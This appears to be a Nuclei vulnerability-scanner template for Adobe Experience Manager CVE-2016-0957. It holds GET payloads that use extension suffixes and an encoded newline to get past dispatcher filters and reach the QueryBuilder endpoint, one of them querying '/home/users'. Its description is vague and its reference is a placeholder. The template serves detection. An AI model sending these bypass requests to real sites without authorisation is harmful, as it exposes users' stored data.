id: custom-aemsite-querybuilder-check

info:
  name: AEM Site Querybuilder Check CVE-2016-0957
  author: x86rd
  severity: info
  description: Checks for successful responses from various endpoints.
  reference: https://aemsite/
  tags: aem,cms

requests:
  - method: GET
    path:
      - "{{BaseURL}}/bin/querybuilder.json/a.css?path=/home/users&type=nt:base"
      - "{{BaseURL}}/bin/querybuilder.json/a.html"
      - "{{BaseURL}}/bin/querybuilder.json/a.ico"
      - "{{BaseURL}}/bin/querybuilder.json/a.png"
      - "{{BaseURL}}/bin/querybuilder.json;%0aa.css"
      - "{{BaseURL}}/bin/querybuilder.json/a.1.json"
    matchers:
      - type: word
        words:
          - '"success":true'
        part: body
        condition: and
